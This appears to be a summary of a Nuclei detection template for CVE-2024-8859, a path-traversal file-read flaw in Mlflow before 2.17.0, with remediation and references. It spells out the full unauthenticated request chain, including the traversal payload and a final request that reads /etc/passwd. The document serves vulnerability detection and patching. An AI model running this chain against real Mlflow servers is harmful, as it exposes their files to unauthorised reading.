---
cve_id: CVE-2024-8859
template_path: nuclei-templates/http/cves/2024/CVE-2024-8859.yaml
affected_product: Mlflow
severity: critical
authentication: none
external_callback: false
affected_versions: < 2.17.0
preconditions: []
poc_classification: info-leak
---

## Vulnerability
Mlflow before 2.17.0 is susceptible to local file inclusion due to path traversal in the mlflow/mlflow GitHub repository. An unauthenticated attacker can read arbitrary files on the server filesystem (e.g. /etc/passwd), potentially obtaining sensitive information, modifying data, and/or executing unauthorized administrative operations.

**Impact:** Successful exploitation allows an attacker to read sensitive files on the server.

**Remediation:** Upgrade Mlflow to version 2.17.0 or later.

## PoC / Detection
Classification: info-leak

The template verifies the LFI by executing this exact unauthenticated multi-step API chain (7 raw requests):
- Create experiment with `{"name": "{{randstr}}", "artifact_location": "dbfs:/"}`
- Create run under the extracted experiment ID
- Upload dummy artifact to path `a?/a`
- Delete the experiment (cleanup)
- Create registered model with random name
- Create model version with source `dbfs:/{{RUN_ID}}/artifacts/a%3f/../../../../../../../../../../../../` (path-traversal payload)
- GET `/model-versions/get-artifact?name={{randstr}}&version=1&path=etc/passwd`

Matchers require HTTP 200 and regex `root:.*:0:0:` in response body. JSON extractors dynamically capture `EXPERIMENT_ID` (body_1) and `RUN_ID` (body_2) for chaining.

## References
- https://huntr.com/bounties/2259b88b-a0c6-4c7c-b434-6aacf6056dcb
- https://github.com/mlflow/mlflow/pull/13161
- https://nvd.nist.gov/vuln/detail/CVE-2024-8859
